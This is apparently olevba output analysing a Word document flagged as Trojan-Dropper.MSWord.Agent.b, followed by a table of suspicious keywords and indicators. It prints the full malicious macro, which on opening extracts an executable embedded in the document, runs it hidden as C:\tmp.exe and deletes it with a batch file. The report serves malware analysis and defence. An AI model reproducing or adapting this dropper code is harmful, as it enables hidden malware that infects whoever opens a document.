olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSWord.Agent.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan-Dropper.MSWord.Agent.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim AD() As Byte
Dim KL() As Byte
Dim I As Long
Const TAD As Long = 123392
Const TKL As Long = 173022
If FileLen(ActiveDocument.FullName) <> (TAD + TKL) Then Exit Sub
ReDim AD(TAD + TKL)
Open ActiveDocument.FullName For Binary As #1
    Get #1, , AD()
Close #1
If AD(TAD) <> 77 Or AD(TAD + 1) <> 90 Then Exit Sub
ReDim KL(TKL)
For I = TAD To TAD + TKL - 1
    KL(I - TAD) = AD(I)
Next
Open "C:\tmp.exe" For Binary As #1
    Put #1, , KL()
Close #1
Shell "C:\tmp.exe", vbHide
Open "C:\tmp.bat" For Output As #1
    Print #1, ":rep"
    Print #1, "del C:\tmp.exe"
    Print #1, "if exist C:\tmp.exe goto rep"
    Print #1, "del C:\tmp.bat"
Close #1
Shell "C:\tmp.bat", vbHide
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|IOC       |tmp.exe             |Executable file name                         |
|IOC       |tmp.bat             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

